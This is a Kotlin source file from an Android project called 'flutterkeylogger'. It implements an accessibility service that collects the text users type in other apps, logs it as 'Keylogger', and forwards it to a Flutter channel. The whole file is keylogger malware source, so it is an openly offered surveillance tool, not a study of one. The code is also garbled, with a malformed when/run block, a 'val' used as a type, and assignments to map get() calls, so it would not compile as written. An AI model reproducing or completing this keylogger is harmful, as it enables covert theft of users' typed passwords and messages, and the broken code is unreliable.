package youtube.sidtube.flutterkeylogger

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class Accservice : AccessibilityService() {
    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("Service", "ss")
        this.registerReceiver(LogReciever(), IntentFilter("android.accessibilityservice.AccessibilityService"))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) { // Log.d("event",event.toString());
        `when`(event.eventType)
        run {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            {
                val data: `val` = event.text.toString()
                datas.get("log") = data
                datas.get("type") = "text"
                Log.d("Keylogger", datas.toString())
                channel.invokeMethod("test", datas)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED
            {}
            AccessibilityEvent.TYPE_VIEW_CLICKED
            {}
            {}
        }
        val intent = Intent()
        intent.putExtra("aa", event)
        LogReciever().onReceive(this, intent)
    }

    override fun onInterrupt() {
        unregisterReceiver(LogReciever())
    }
}